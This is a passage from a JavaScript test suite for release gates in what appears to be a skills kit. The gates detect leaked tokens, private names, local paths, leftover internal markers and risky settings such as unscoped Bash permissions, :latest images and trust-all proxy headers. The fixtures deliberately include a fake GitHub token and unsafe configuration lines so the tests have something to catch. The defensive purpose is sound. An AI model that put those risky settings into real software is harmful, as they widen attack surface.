// tools/export/test/gates.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { deflateRawSync } from 'node:zlib';
import { detectTable } from '../detect.mjs';
import { walkFiles, gateSecrets, gatePrivacy, gatePaths, gateAccounting, gateLinks, gateNotes, gateDiagramUrls, gateTriage, gateRisky, gateStudioBlocks, gateMarkers, MARKERS_ALLOW, gateNames, NAMES_ALLOW, gateJson, shebangFiles, gateScanner, SCANNER_ALLOW } from '../gates.mjs';

function kit(files) {
  const root = mkdtempSync(path.join(os.tmpdir(), 'kit-gates-'));
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    writeFileSync(path.join(root, rel), text);
  }
  return root;
}
const token = 'ghp_' + 'b2'.repeat(18);
const WIN_HUB = ['E:', 'AppDev'].join('\\');

test('walkFiles lists files, skipping .git', () => {
  const root = kit({ 'a.md': 'x', '.git/HEAD': 'ref', 'docs/b.md': 'y' });
  try { assert.deepEqual(walkFiles(root), ['a.md', 'docs/b.md']); } finally { rmSync(root, { recursive: true, force: true }); }
});

test('secrets: found in content, the pipeline source and tests included; only rules.mjs is exempt', () => {
  const root = kit({ 'docs/a.md': `key ${token}\n`, 'tools/export/rules.mjs': `const t = '${token}';\n`, 'tools/export/x.mjs': `const t = '${token}';\n` });
  try { assert.deepEqual(gateSecrets(root), ['docs/a.md:1 github-token', 'tools/export/x.mjs:1 github-token']); } finally { rmSync(root, { recursive: true, force: true }); }
});

test('privacy: content and file names are checked, by list position only; local files are skipped', () => {
  const root = kit({
    'modules/01/README.md': 'ok\nmet Zorblat today\n',
    'examples/zorblat-notes.md': 'clean\n',
    'tools/export/privacy.local.txt': 'Zorblat\n',
    'tools/export/owner.local.txt': 'Zorblat\n',
    'tools/export/rewrites.local.json': '[{"phrase": "Zorblat app"}]\n',
  });
  try {
    assert.deepEqual(gatePrivacy(root, ['acme', 'Zorblat']), ['examples/zorblat-notes.md: file name has denied term #2', 'modules/01/README.md:2 denied term #2']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('paths: found in content and tests; only rules.mjs is exempt', () => {
  const root = kit({ 'examples/s.md': `run ${WIN_HUB}\\x\n`, 'tools/export/rules.mjs': `'${WIN_HUB}'\n`, 'tools/export/test/t.mjs': `'${WIN_HUB}'\n` });
  try { assert.deepEqual(gatePaths(root), ['examples/s.md:1 hub-path', 'tools/export/test/t.mjs:1 hub-path']); } finally { rmSync(root, { recursive: true, force: true }); }
});

test('paths: an allowed phrase passes only in its own file, and only that phrase', () => {
  const product = ['Tail', 'scale'].join('');
  const allow = [{ file: 'catalog/skills/x/server.cjs', phrase: `${product} SSH`, why: 'upstream comment' }];
  const root = kit({
    'catalog/skills/x/server.cjs': `// common on WSL, ${product} SSH, and others\n// my ${product.toLowerCase()} box\n`,
    'catalog/skills/y/server.cjs': `// common on WSL, ${product} SSH, and others\n`,
  });
  try {
    assert.deepEqual(gatePaths(root, allow), ['catalog/skills/x/server.cjs:2 tailnet', 'catalog/skills/y/server.cjs:1 tailnet']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// The risky patterns are assembled at runtime, so this file itself passes the risky gate.
const AT = ['allowed', 'tools'].join('-');
const LATEST = ['lat', 'est'].join('');
const FWD = ['forwarded', 'allow', 'ips'].join('-');
const TRUSTED = ['trusted', 'hosts'].join('_');

test('risky: each unsafe pattern is found, with its line and reason; rules.mjs is exempt', () => {
  const root = kit({
    'catalog/skills/a/SKILL.md': `---\nname: a\n${AT}: Bash Read\n---\n`,
    'catalog/skills/b/SKILL.md': `---\nname: b\n${AT}: Read, Write, Grep\n---\n`,
    'catalog/skills/c/SKILL.md': `---\nname: c\n${AT}: [Read, Bash, Write]\n---\n`,
    'catalog/skills/d/SKILL.md': `---\nname: d\n${AT}:\n  - Read\n  - Bash\n---\n`,
    'catalog/packs/p/skills/docker.md': `FROM python:3.12-slim\nimage: ghcr.io/acme/app:${LATEST}\n`,
    'catalog/packs/p/skills/mcp.md': `Run \`npx -y some-mcp@${LATEST}\` once.\nnpm i @scope/tool@${LATEST}\n`,
    'catalog/packs/p/skills/proxy.md': [
      `uvicorn app:app --${FWD}=*`, `${FWD}="*"`, `app.add_middleware(ProxyHeadersMiddleware, ${TRUSTED}="*")`, `${TRUSTED}=["*"]`, '',
    ].join('\n'),
    'tools/export/rules.mjs': `// ${AT}: Bash\n// x/y:${LATEST} z@${LATEST} ${FWD}="*"\n`,
  });
  try {
    assert.deepEqual(gateRisky(root, []), [
      'catalog/packs/p/skills/docker.md:2 image with :latest',
      'catalog/packs/p/skills/mcp.md:1 @latest in a command',
      'catalog/packs/p/skills/mcp.md:2 @latest in a command',
      'catalog/packs/p/skills/proxy.md:1 trust everything ("*")',
      'catalog/packs/p/skills/proxy.md:2 trust everything ("*")',
      'catalog/packs/p/skills/proxy.md:3 trust everything ("*")',
      'catalog/packs/p/skills/proxy.md:4 trust everything ("*")',
      'catalog/skills/a/SKILL.md:3 bare Bash in allowed-tools',
      'catalog/skills/b/SKILL.md:3 bare Write in allowed-tools',
      'catalog/skills/c/SKILL.md:3 bare Bash in allowed-tools',
      'catalog/skills/c/SKILL.md:3 bare Write in allowed-tools',
      'catalog/skills/d/SKILL.md:5 bare Bash in allowed-tools',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('risky: scoped tools, other tags, prose about the tag and narrow trust lists pass', () => {
  const root = kit({
    'catalog/skills/a/SKILL.md': `---\nname: a\n${AT}: Bash(git branch:*) Read\n---\n`,
    'catalog/skills/b/SKILL.md': `---\nname: b\n${AT}: Read, Write(docs/**), Bash(npm test), NotebookEdit\n---\nUse Bash and Write freely in the body.\n`,
    'catalog/packs/p/skills/docker.md': `image: ghcr.io/acme/app:1.4.2\nPin a version; the :${LATEST} tag moves.\nnpx -y some-mcp@1.2.3\n`,
    'catalog/packs/p/skills/proxy.md': `--${FWD}=192.0.2.1\n${TRUSTED}=["192.0.2.1"]\n`,
  });
  try { assert.deepEqual(gateRisky(root, []), []); } finally { rmSync(root, { recursive: true, force: true }); }
});

// The block marker word, assembled at runtime, so this file carries no marker for the gate to find.
const only = ['studio', 'only'].join('-');

test('studio blocks: a marker left in any shipped text file is found, in any case; only rules.mjs is exempt', () => {
  const root = kit({
    'catalog/skills/a/SKILL.md': `ok\n<!-- ${only} -->\n`,
    'catalog/skills/a/scripts/run.py': `# <!-- /${only} -->\r\nprint(1)\r\n`,
    'docs/notes.md': `fine\nA ${only.toUpperCase()} note\n`,
    'catalog/skills/a/clean.md': 'studio only, not in this kit\n',
    'tools/export/rules.mjs': `const m = '${only}';\n`,
  });
  try {
    assert.deepEqual(gateStudioBlocks(root), [
      `catalog/skills/a/SKILL.md:2 ${only} marker left in shipped text`,
      `catalog/skills/a/scripts/run.py:1 ${only} marker left in shipped text`,
      `docs/notes.md:2 ${only} marker left in shipped text`,
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('studio blocks: an allowed phrase passes only in its own file, and only on its line', () => {
  const allow = [{ file: 'docs/MAINTAINING.md', phrase: `wrap it in <!-- ${only} -->`, why: 'the maintainer guide names the marker' }];
  const root = kit({
    'docs/MAINTAINING.md': `To keep a rule, wrap it in <!-- ${only} --> lines.\nA bare ${only} here.\n`,
    'docs/other.md': `To keep a rule, wrap it in <!-- ${only} --> lines.\n`,
  });
  try {
    assert.deepEqual(gateStudioBlocks(root, allow), [`docs/MAINTAINING.md:2 ${only} marker left in shipped text`, `docs/other.md:1 ${only} marker left in shipped text`]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('studio markers: found in catalog/ text, code comments included; files outside catalog/ and rules.mjs pass', () => {
  const root = kit({
    'catalog/skills/a/SKILL.md': 'ok\n## Hard rules\nAsk the hub and G6.\n',
    'catalog/skills/a/scripts/run.py': '# bound to this machine only\r\nprint(1)\r\n',
    'cards/a.md': 'the hub speaks to the maintainer\n',
    'docs/notes.md': 'his yes, G1\n',
    'tools/export/rules.mjs': "const m = 'the hub';\n",
  });
  try {
    assert.deepEqual(gateMarkers(root), [
      'catalog/skills/a/SKILL.md:2 studio marker "hard rule"',
      'catalog/skills/a/SKILL.md:3 studio marker "the hub"',
      'catalog/skills/a/SKILL.md:3 studio marker "G6"',
      'catalog/skills/a/scripts/run.py:1 studio marker "this machine"',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('studio markers: catalog/DETECT.md is read as the cards it is made from, only while it is exactly that; every other gate reads it', () => {
  // A card speaks to the reader and may say "this machine"; catalog/DETECT.md carries its Detect section.
  const card = '# Draw\n\n## Detect\n\n- What the skill can use on this machine: `command -v dot` prints a path.\n\n## Ask\n\nx\n';
  const root = kit({ 'cards/draw.md': card, 'catalog/skills/b/SKILL.md': 'Run it on this machine.\n' });
  const w = (rel, t) => writeFileSync(path.join(root, rel), t);
  try {
    w('catalog/DETECT.md', detectTable(root));
    // The generated file passes; the same marker in any other catalog file still fails.
    assert.deepEqual(gateMarkers(root), ['catalog/skills/b/SKILL.md:1 studio marker "this machine"']);
    // A hand edit makes it a file like any other: every marker in it is reported, the card's included.
    w('catalog/DETECT.md', `${detectTable(root)}\nAsk the hub.\n`);
    assert.deepEqual(gateMarkers(root).filter((f) => f.startsWith('catalog/DETECT.md')).map((f) => f.split(' studio marker ')[1]), ['"this machine"', '"the hub"']);
    // The other gates read it even while it is exactly the generated file: a card's Detect line that holds a
    // denied term, a home path and a token is flagged in catalog/DETECT.md by each of them.
    // The home path is put together at run time, so this file ships none for the paths gate to find.
    const home = ['', 'home', 'quenlin', 'notes'].join('/');
    w('cards/draw.md', card.replace('prints a path.', `prints a path. Quenlin keeps ${home} and ghp_${'a'.repeat(36)}.`));
    w('catalog/DETECT.md', detectTable(root));
    assert.ok(!gateMarkers(root).some((f) => f.startsWith('catalog/DETECT.md')), 'the markers gate skips the generated file');
    assert.ok(gatePrivacy(root, ['Quenlin']).some((f) => f.startsWith('catalog/DETECT.md:')), 'privacy');
    assert.ok(gatePaths(root).some((f) => f.startsWith('catalog/DETECT.md:')), 'paths');
    assert.ok(gateSecrets(root).some((f) => f.startsWith('catalog/DETECT.md')), 'secrets');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('studio markers: an allowed phrase passes only in its own file, and only on its line', () => {
  const allow = [{ file: 'catalog/packs/p/skills/law.md', phrase: 'guideline G6', why: 'a regulator guideline number' }];
  const root = kit({
    'catalog/packs/p/skills/law.md': 'Read guideline G6 first.\nThen G6 again.\n',
    'catalog/packs/p/skills/other.md': 'Read guideline G6 first.\n',
  });
  try {
    assert.deepEqual(gateMarkers(root, allow), ['catalog/packs/p/skills/law.md:2 studio marker "G6"', 'catalog/packs/p/skills/other.md:1 studio marker "G6"']);
    assert.ok(Array.isArray(MARKERS_ALLOW) && MARKERS_ALLOW.every((a) => a.file && a.phrase && a.why), 'MARKERS_ALLOW entries are { file, phrase, why }');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('risky: an allowed phrase passes only in its own file, and only on its line', () => {
  const allow = [{ file: 'catalog/skills/x/SKILL.md', phrase: 'Never write', why: 'a warning against the pattern' }];
  const root = kit({
    'catalog/skills/x/SKILL.md': `Never write \`image: app:${LATEST}\`.\nimage: app:${LATEST}\n`,
    'catalog/skills/y/SKILL.md': `Never write \`image: app:${LATEST}\`.\n`,
  });
  try {
    assert.deepEqual(gateRisky(root, allow), ['catalog/skills/x/SKILL.md:2 image with :latest', 'catalog/skills/y/SKILL.md:1 image with :latest']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('risky: the kit itself passes its risky gate, hand-written files included', () => {
  assert.deepEqual(gateRisky(fileURLToPath(new URL('../../../', import.meta.url))), []);
});

test('the kit itself passes its paths, secrets and markers gates, its tests included, so npm test finds what a release would', () => {
  // The v3.5.0 dry run found a test's literal home path and a card's words in catalog/DETECT.md only at
  // release time; these hold the kit's own files to the same gates in every test run.
  const kitRoot = fileURLToPath(new URL('../../../', import.meta.url));
  assert.deepEqual(gatePaths(kitRoot), [], 'paths');
  assert.deepEqual(gateSecrets(kitRoot), [], 'secrets');
  assert.deepEqual(gateMarkers(kitRoot), [], 'markers');
});

test('risky: an image with neither a tag nor a digest, in a Dockerfile, a YAML file or a fenced block', () => {
  const fence = '```';
  const root = kit({
    'catalog/packs/p/templates/Dockerfile.python.template': [
      'FROM python:3.12-slim AS builder', 'FROM builder', 'FROM scratch', 'FROM gcr.io/distroless/python3-debian12',
      'FROM --platform=linux/amd64 alpine', 'FROM ghcr.io/acme/app@sha256:' + 'ab'.repeat(32), 'FROM localhost:5000/app',
      'FROM ${BASE_IMAGE}', 'from node AS web', '',
    ].join('\n'),
    'catalog/packs/p/templates/docker-compose.yml': [
      'services:', '  db:', '    image: postgres', '  cache:', '    image: redis:7-alpine', '  app:', '    image: shopapi:${APP_VERSION}',
      '  - image: "nginx"', '  web:', '    image:', '      repository: nginx', '',
    ].join('\n'),
    'catalog/packs/p/skills/docker.md': [
      'FROM there, the image: a picture.', `${fence}dockerfile`, 'FROM node:22-slim AS build', 'FROM node', `${fence}`,
      `${fence}yaml`, 'image: busybox', `${fence}`, `${fence}`, 'FROM ubuntu', 'image: ubuntu', `${fence}`, '',
    ].join('\n'),
    'catalog/packs/p/skills/page.ts': "  image: '/images/hero.webp',\nFROM users\n",
  });
  try {
    assert.deepEqual(gateRisky(root, []), [
      'catalog/packs/p/skills/docker.md:4 image without a tag or digest',
      'catalog/packs/p/skills/docker.md:7 image without a tag or digest',
      'catalog/packs/p/templates/Dockerfile.python.template:4 image without a tag or digest',
      'catalog/packs/p/templates/Dockerfile.python.template:5 image without a tag or digest',
      'catalog/packs/p/templates/Dockerfile.python.template:7 image without a tag or digest',
      'catalog/packs/p/templates/Dockerfile.python.template:9 image without a tag or digest',
      'catalog/packs/p/templates/docker-compose.yml:3 image without a tag or digest',
      'catalog/packs/p/templates/docker-compose.yml:8 image without a tag or digest',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('risky: Bash(*), Bash(), Write(*) and Write() are bare, and an allowed-tools block value is read', () => {
  const root = kit({
    'catalog/skills/a/SKILL.md': `---\nname: a\n${AT}: Bash(*) Read\n---\n`,
    'catalog/skills/b/SKILL.md': `---\nname: b\n${AT}: Read, Bash(), Write( * )\n---\n`,
    'catalog/skills/c/SKILL.md': `---\nname: c\n${AT}: Write() Write(**)\n---\n`,
    'catalog/skills/d/SKILL.md': `---\nname: d\n${AT}: >-\n  Read Grep\n  Bash Write(docs/**)\ndescription: Bash and Write in prose.\n---\n`,
    'catalog/skills/e/SKILL.md': `---\nname: e\n${AT}: |\n  Bash(git status:*) Read\n\n  Write\n---\n`,
  });
  try {
    assert.deepEqual(gateRisky(root, []), [
      'catalog/skills/a/SKILL.md:3 bare Bash in allowed-tools',
      'catalog/skills/b/SKILL.md:3 bare Bash in allowed-tools',
      'catalog/skills/b/SKILL.md:3 bare Write in allowed-tools',
      'catalog/skills/c/SKILL.md:3 bare Write in allowed-tools',
      'catalog/skills/d/SKILL.md:5 bare Bash in allowed-tools',
      'catalog/skills/e/SKILL.md:6 bare Write in allowed-tools',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('accounting: PRINCIPLES.md is a hand-written file', () => {
  const root = kit({ 'PRINCIPLES.md': '# How we work\n' });
  try { assert.deepEqual(gateAccounting(root, { written: [], notices: [], manifest: { items: [] } }), []); } finally { rmSync(root, { recursive: true, force: true }); }
});

test('accounting: stray catalog files, unknown encodings, unknown locations, unlicensed third-party skills, external items without licence', () => {
  const root = kit({ 'catalog/INDEX.md': 'i', 'catalog/stray.md': 's', 'modules/u.md': Buffer.from('\uFEFFhi', 'utf16le'), 'modules/x.md': 'm', 'random.txt': 'r' });
  try {
    const manifest = { items: [{ id: 'tool', kind: 'external', status: 'link-only', pack: 'foundation', upstream: 'u' }] };
    assert.deepEqual(gateAccounting(root, { written: ['catalog/INDEX.md'], notices: [{ id: 'b', licenceFile: null }], manifest }), [
      'catalog/stray.md: in catalog/ but not produced by this export',
      'modules/u.md: neither UTF-8 text nor a known binary type',
      'random.txt: not produced by the export and not in a hand-written location',
      'catalog/skills/b: third-party skill shipped without a licence file',
      'tool: external item without upstream or licence',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('links: relative links must resolve with the exact case, inside the kit; web links, anchors, code and comments are ignored', () => {
  const root = kit({
    'a.md': '[ok](docs/b.md) [bad](missing.md) [web](https://x.invalid) [anchor](#top) [deep](docs/b.md#part)\n```\n[no](nothere.md)\n```\n`[inline](gone.md)`\n<!-- an example line:\n- [Title](file.md) -->\n',
    'docs/b.md': '[up](../a.md) [case](MAINTAINING.md) [wrong](maintaining.md) [out](../../outside.md)\n',
    'docs/MAINTAINING.md': 'm\n',
  });
  try {
    assert.deepEqual(gateLinks(root), ['a.md: broken link -> missing.md', 'docs/b.md: broken link -> maintaining.md', 'docs/b.md: broken link -> ../../outside.md']);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('notes: a --note is checked for denied terms, paths and secrets before anything is built', () => {
  assert.deepEqual(gateNotes(['A fine note.', `Thanks to Zorblat, see ${WIN_HUB}`, token], ['acme', 'Zorblat']), [
    '--note 2: denied term #2', '--note 2: hub-path', '--note 3: github-token',
  ]);
});

test('notes: a --note naming the block marker fails, since the changelog it lands in is shipped and gated', () => {
  assert.deepEqual(gateNotes(['Fine.', `Hub text in ${only.toUpperCase()} blocks is cut.`], []), [`--note 2: ${only} marker left in shipped text`]);
});

const scanOf = (recommendation, score, findings) => ({ recommendation, score, ...(findings === undefined ? {} : { findings }), version: 'v2.13.6', date: '2026-11-21' });
const readOf = (recommendation, score, rows) => ({ recommendation, score, rows, anchor: 'a' });
const fnd = (rule, file, line, severity = 'HIGH') => ({ rule, file, line, severity });
const row = (rule, file, line, verdict = 'FP') => ({ rule, file, line, verdict });

test('triage: rows that match the recorded findings one to one pass, a finding found twice included; a SAFE scan with no findings needs no section', () => {
  const found = [fnd('LP3', 'SKILL.md', 1, 'MEDIUM'), fnd('SC1', 'refs/a.md', null, 'LOW'), fnd('TM1', 'scripts/s.sh', 2), fnd('TM1', 'scripts/s.sh', 2)];
  const scans = { ok: scanOf('DO_NOT_INSTALL', 100, found), clean: scanOf('SAFE', 0, []) };
  const triage = { ok: readOf('DO_NOT_INSTALL', 100, [row('TM1', 'scripts/s.sh', 2), row('LP3', 'SKILL.md', 1, 'BY DESIGN'), row('TM1', 'scripts/s.sh', 2), row('SC1', 'refs/a.md', null)]) };
  assert.deepEqual(gateTriage({ keys: ['ok', 'clean'], scans, triage }), []);
});

test('triage: a recorded finding with no row fails, and so does a row that matches no recorded finding', () => {
  const scans = {
    missing: scanOf('CAUTION', 25, [fnd('SC1', 'refs/a.md', null), fnd('TM1', 'scripts/s.sh', 2), fnd('TM1', 'scripts/s.sh', 2)]),
    extra: scanOf('CAUTION', 25, [fnd('TM1', 'scripts/s.sh', 2)]),
  };
  const triage = {
    missing: readOf('CAUTION', 25, [row('TM1', 'scripts/s.sh', 2)]),
    extra: readOf('CAUTION', 25, [row('TM1', 'scripts/s.sh', 2), row('TM1', 'scripts/s.sh', 3)]),
  };
  assert.deepEqual(gateTriage({ keys: ['missing', 'extra'], scans, triage }), [
    'missing: finding SC1 refs/a.md has no triage row',
    'missing: finding TM1 scripts/s.sh:2 has no triage row',
    'extra: triage row TM1 scripts/s.sh:3 matches no recorded finding',
  ]);
});

test('triage: a row judged neither FP nor BY DESIGN fails', () => {
  const scans = { real: scanOf('DO_NOT_INSTALL', 60, [fnd('PE3', 'x.cjs', 5), fnd('TM1', 't.sh', 3)]) };
  const triage = { real: readOf('DO_NOT_INSTALL', 60, [row('PE3', 'x.cjs', 5, 'REAL'), row('TM1', 't.sh', 3)]) };
  assert.deepEqual(gateTriage({ keys: ['real'], scans, triage }), [
    'real: triage row PE3 x.cjs:5 is judged REAL, neither FP nor BY DESIGN; a real finding is fixed or the item is withheld, never shipped',
  ]);
});

test('triage: a SAFE scan with findings is checked like any other', () => {
  const scans = { bare: scanOf('SAFE', 10, [fnd('LP3', 'SKILL.md', 1)]), read: scanOf('SAFE', 10, [fnd('LP3', 'SKILL.md', 1), fnd('TM1', 'a.sh', 4)]) };
  const triage = { read: readOf('SAFE', 10, [row('LP3', 'SKILL.md', 1, 'BY DESIGN')]) };
  assert.deepEqual(gateTriage({ keys: ['bare', 'read'], scans, triage }), [
    'bare: last scan SAFE (10/100), and tools/export/scan-triage.md has no section for it; read every finding and add one',
    'read: finding TM1 a.sh:4 has no triage row',
  ]);
});

test('triage: a section for another verdict or score fails, and so does a scan that records no list of findings', () => {
  const scans = { none: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), rescanned: scanOf('CAUTION', 35, [fnd('TM1', 'a.sh', 1)]), counted: scanOf('SAFE', 0, 0), unlisted: scanOf('CAUTION', 25) };
  const triage = { rescanned: readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), unlisted: readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]) };
  assert.deepEqual(gateTriage({ keys: ['none', 'rescanned', 'counted', 'unlisted'], scans, triage }), [
    'none: last scan CAUTION (25/100), and tools/export/scan-triage.md has no section for it; read every finding and add one',
    'rescanned: last scan CAUTION (35/100), but its triage section is for CAUTION (25/100); triage the new scan',
    'counted: scans.json records no list of findings for its last scan; run node tools/export/scan.mjs again',
    'unlisted: scans.json records no list of findings for its last scan; run node tools/export/scan.mjs again',
  ]);
});

test('triage: a heading whose count of findings differs from its rows fails; a table with no File:line column is one finding for the section', () => {
  const scans = { counted: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), right: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), nowhere: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]) };
  const triage = {
    counted: { ...readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), count: 3 },
    right: { ...readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), count: 1 },
    nowhere: { ...readOf('CAUTION', 25, [{ rule: 'TM1', file: '', line: null, verdict: 'FP' }]), noFileLine: true },
  };
  assert.deepEqual(gateTriage({ keys: ['counted', 'right', 'nowhere'], scans, triage }), [
    'counted: heading says 3 findings, the section has 1 rows',
    'the triage table for nowhere has no File:line column',
  ]);
});

test('triage: two sections for one item fail; an item with no scan fails only at a release', () => {
  const scans = { twice: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]) };
  const triage = { twice: { ...readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), duplicate: true } };
  assert.deepEqual(gateTriage({ keys: ['twice', 'unscanned'], scans, triage }), [
    'twice: tools/export/scan-triage.md has more than one section for it; keep one',
  ]);
  assert.deepEqual(gateTriage({ keys: ['unscanned'], scans, triage, release: true }), [
    'unscanned: no scan in scans.json; a release ships only scanned items (node tools/export/scan.mjs)',
  ]);
});

test('triage: at a release, an item whose content changed since its scan fails, whatever its verdict, and so does a scan with no itemHash', () => {
  const scans = {
    same: { ...scanOf('SAFE', 0, []), itemHash: 'aaaa' },
    edited: { ...scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), itemHash: 'bbbb' },
    quiet: { ...scanOf('SAFE', 0, []), itemHash: 'cccc' },
    old: scanOf('SAFE', 0, []),
  };
  const triage = { edited: readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]) };
  const hashes = { same: 'aaaa', edited: 'b000', quiet: 'c000', old: 'dddd' };
  const keys = ['same', 'edited', 'quiet', 'old'];
  assert.deepEqual(gateTriage({ keys, scans, triage, release: true, hashes }), [
    'edited: the item changed since its scan; rescan and re-read its triage',
    'quiet: the item changed since its scan; rescan and re-read its triage',
    'old: scans.json records no itemHash for its last scan; rescan it (node tools/export/scan.mjs)',
  ]);
  // A dry run must still write the changed catalog, so that it can be scanned: no hash finding there.
  assert.deepEqual(gateTriage({ keys, scans, triage, hashes }), []);
  // At a release, an item the export could not hash fails: no hashes at all, or none for that key.
  assert.deepEqual(gateTriage({ keys: ['same', 'quiet'], scans, triage, release: true, hashes: { same: 'aaaa' } }), [
    'quiet: the export could not hash it, so its scan cannot be tied to what ships',
  ]);
  assert.deepEqual(gateTriage({ keys: ['same'], scans, triage, release: true }), [
    'same: the export could not hash it, so its scan cannot be tied to what ships',
  ]);
});

test('diagram links: the payload must decode to the .drawio beside it', () => {
  const url = (xml) => `https://viewer.diagrams.net/?tags=%7B%7D#R${encodeURIComponent(deflateRawSync(Buffer.from(encodeURIComponent(xml))).toString('base64'))}`;
  const xml = '<mxfile><diagram name="d">a &amp; b</diagram></mxfile>\n';
  const root = kit({
    'docs/flow.drawio': xml, 'docs/flow.url.txt': `${url(xml)}\n`,
    'docs/old.drawio': xml, 'docs/old.url.txt': url(xml.replace('a &amp; b', 'secret text')),
    'docs/none.url.txt': 'https://example.invalid/\n',
  });
  try {
    assert.deepEqual(gateDiagramUrls(root), [
      'docs/none.url.txt: no #R payload, or no docs/none.drawio beside it',
      'docs/old.url.txt: payload differs from docs/old.drawio; regenerate the link',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

const NAMES = { studio: ['claude-md-curator', 'handoff', 'save-session', 'teach'], shipped: ['handoff', 'teach'] };
const FENCE3 = '`'.repeat(3);

test('names: a studio name the kit does not ship, in whole inline code or in [[brackets]], is found in catalog/ Markdown outside fences', () => {
  const root = kit({
    'catalog/skills/a/SKILL.md': [
      'Run `save-session` at the end.',
      'Then `handoff`, keep `handoff-notes.md` and `save-session-notes.md`, the `teacher` and `teach`.',
      'See [[claude-md-curator]], [[handoff]] and [[handoff|the handoff skill]].',
      'Use `` /save-session `` and [[outside-thing|a label]]; `[[claude-md-curator]]` is the syntax.',
      FENCE3, '`save-session` and [[claude-md-curator]] in a fence', FENCE3,
      '~~~md', '`save-session`', '~~~',
      '`save-session` after, and `save-session` twice.',
      `${FENCE3}save-session${FENCE3} is inline code, not a fence.`,
      '`save-session` still seen.',
    ].join('\r\n'),
    'catalog/skills/a/scripts/run.py': '# `save-session`\n',
    'cards/a.md': 'Run `save-session` and [[claude-md-curator]].\n',
  });
  try {
    assert.deepEqual(gateNames(root, NAMES), [
      'catalog/skills/a/SKILL.md:1 names save-session, which the kit does not ship',
      'catalog/skills/a/SKILL.md:3 names claude-md-curator, which the kit does not ship',
      'catalog/skills/a/SKILL.md:4 names save-session, which the kit does not ship',
      'catalog/skills/a/SKILL.md:4 names outside-thing, which the kit does not ship',
      'catalog/skills/a/SKILL.md:11 names save-session, which the kit does not ship',
      'catalog/skills/a/SKILL.md:12 names save-session, which the kit does not ship',
      'catalog/skills/a/SKILL.md:13 names save-session, which the kit does not ship',
    ]);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: an allow entry passes only its own name in its own file', () => {
  const allow = [{ file: 'catalog/a.md', name: 'save-session', why: 'an outside tool of the same name' }];
  const root = kit({
    'catalog/a.md': 'Run `save-session`, then [[claude-md-curator]].\n',
    'catalog/b.md': 'Run `save-session`.\n',
  });
  try {
    assert.deepEqual(gateNames(root, NAMES, allow), [
      'catalog/a.md:1 names claude-md-curator, which the kit does not ship',
      'catalog/b.md:1 names save-session, which the kit does not ship',
    ]);
    assert.ok(Array.isArray(NAMES_ALLOW) && NAMES_ALLOW.every((a) => a.file && a.name && a.why), 'NAMES_ALLOW entries are { file, name, why }');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: a private studio name, in whole inline code or in [[brackets]], is found without printing it; an allow entry never passes it', () => {
  const names = { ...NAMES, private: ['quiet-job', 'quiet-pack'] };
  const allow = [{ file: 'catalog/a.md', name: 'quiet-job', why: 'never honoured for a private name' }];
  const root = kit({
    'catalog/a.md': [
      'Run `quiet-job`, or `` /quiet-job ``.',
      'See [[quiet-pack]], then [[quiet-pack|a label]] and [[save-session]].',
      'Keep `quiet-job-notes.md`, and quiet-job in prose.',
      FENCE3, '`quiet-job` and [[quiet-pack]]', FENCE3,
    ].join('\n'),
  });
  try {
    const found = gateNames(root, names, allow);
    assert.deepEqual(found, [
      'catalog/a.md:1 names a private studio item (on the private list, private.local.txt, or in a hub pack whose pack.json says public: false)',
      'catalog/a.md:2 names a private studio item (on the private list, private.local.txt, or in a hub pack whose pack.json says public: false)',
      'catalog/a.md:2 names save-session, which the kit does not ship',
    ]);
    assert.ok(!found.join('\n').includes('quiet'), 'a private name is never printed');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('names: a studio name in the front matter description, as plain text, is found in any case and as a whole word', () => {
  const allow = [{ file: 'catalog/skills/e/SKILL.md', name: 'save-session', why: 'an outside tool of the same name' }];
  const root = kit({
    'catalog/skills/a/SKILL.md': ['---', 'name: a', 'description: Use at the end. Pairs with Save-Session.', '---', 'Body: save-session in prose is not a citation.'].join('\n'),
    'catalog/skills/b/SKILL.md': ['---', 'name: b', 'description: >-', '  Use when stuck.', '  Pairs with claude-md-curator and handoff', 'metadata:', '  note: save-session', '---', ''].join('\r\n'),
    'catalog/skills/c/SKILL.md': ['---', 'name: c', 'description: Run `save-session` first, then save-session again.', '---', ''].join('\n'),
    'catalog/skills/d/SKILL.md': ['---', 'name: d', 'description: "Not save-sessions, pre-save-session, save-session-notes or claude-md-curator_x; teach is shipped."', '---', ''].join('\n'),
    'catalog/skills/e/SKILL.md': ['---', 'name: e', 'description: Pairs with save-session.', '---', ''].join('\n'),
    'catalog/a.md': ['No front matter.', 'description: save-session'].join('\n'),
    'cards/a.md': '---\ndescription: Pairs with save-session.\n---\n',
  });
  try {
